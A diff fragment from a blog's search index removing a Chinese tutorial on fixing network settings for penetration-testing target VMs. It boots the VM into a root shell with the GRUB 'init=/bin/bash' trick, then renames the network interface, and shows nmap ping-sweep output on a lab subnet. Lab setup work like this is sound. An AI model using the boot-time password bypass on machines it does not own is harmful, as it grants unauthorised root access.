class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.41</span> seconds</span><br></pre></td></tr></table></figure></div>
-<p>比如我这里这三个ip都不是靶机</p>
-<h3 id="debian系解决方案"><a href="#debian系解决方案" class="headerlink" title="debian系解决方案"></a>debian系解决方案</h3><p>这时 先关闭靶机 在启动的蓝色界面 按e进入命令行模式<br>（如果一直没有出现这个蓝色界面说明不是debian系的，在启动的时候按shift也能进入这个界面）<br>光标下移  找到ro（这里的倒数第三行） 改成rw single init&#x3D;&#x2F;bin&#x2F;bash<br>ctrl + x 进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679a51aad0e0a243d4f87be5.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be6.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be7.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">ip <span class="keyword">a</span> <span class="comment">#查看实际使用网卡 (我这里就是enp0s1)</span></span><br></pre></td></tr></table></figure></div>
-<p><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be8.png"><br>然后输入 </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces <span class="punctuation">#</span><span class="params">(编辑网卡)</span></span><br></pre></td></tr></table></figure></div>
-<p>这里用nano 不用vim  vim不知道为什么在这个模式下面更改不了内容<br>然后把网卡替换成实际的网卡(enp0s3 改成 enp0s1)<br><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be9.png"><br><img src="https://pic1.imgdb.cn/item/679a5210d0e0a243d4f87bf1.png"><br>ctrl + o 保存 回车确定 最后ctrl + x 退出<br>重启网络服务</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service networking restart</span></span><br></pre></td></tr></table></figure></div>
-<p>等加载之后重启虚拟机  就发现可以扫到ip啦 (如果还是不行可以尝试把utm网络中桥接的端口从自动改成en0)<br><img src="https://pic1.imgdb.cn/item/679a5211d0e0a243d4f87bf2.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">30</span> <span class="number">00</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.135</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.17</span>s latency).</span><br><span class="line">MAC Address: B6:<span class="number">9</span>C:<span class="number">5</span>D:<span class="number">4</span>F:DE:AB (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">3.69</span> seconds</span><br></pre></td></tr></table></figure></div>
-<h3 id="ubuntu系统"><a href="#ubuntu系统" class="headerlink" title="ubuntu系统"></a>ubuntu系统</h3><p>如果开机的时候一直加载进度进度条，没有出现蓝色界面，说明是ubuntu系统。<br>按shift进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679dd3ddd0e0a243d4f972dc.png"><br>然后按e，把ro改成 rw single init&#x3D;&#x2F;bin&#x2F;bash 并且把这行后面的都删除，直到initrd<br><img src="https://pic1.imgdb.cn/item/679dd50ed0e0a243d4f972f2.png"><br>ctrl + x开机<br>和dibian系一样用ip a查看真实ip端口<br>不一样的是这里网卡配置文件在</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">/etc/netplan/<span class="number">00</span>-installer-config.yaml</span><br></pre></td></tr></table></figure></div>
-<p>修改成真实网卡（我这里3改成1）<br><img src="https://pic1.imgdb.cn/item/679dd746d0e0a243d4f97313.png"><br>ctrl + o 回车  ctrl + x 退出<br>然后重启靶机 就可以获取到靶机ip了</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>靶场配置</category>
-      </categories>
-      <tags>
-        <tag>工具</tag>
-        <tag>靶场</tag>
       </tags>
   </entry>
 </search>
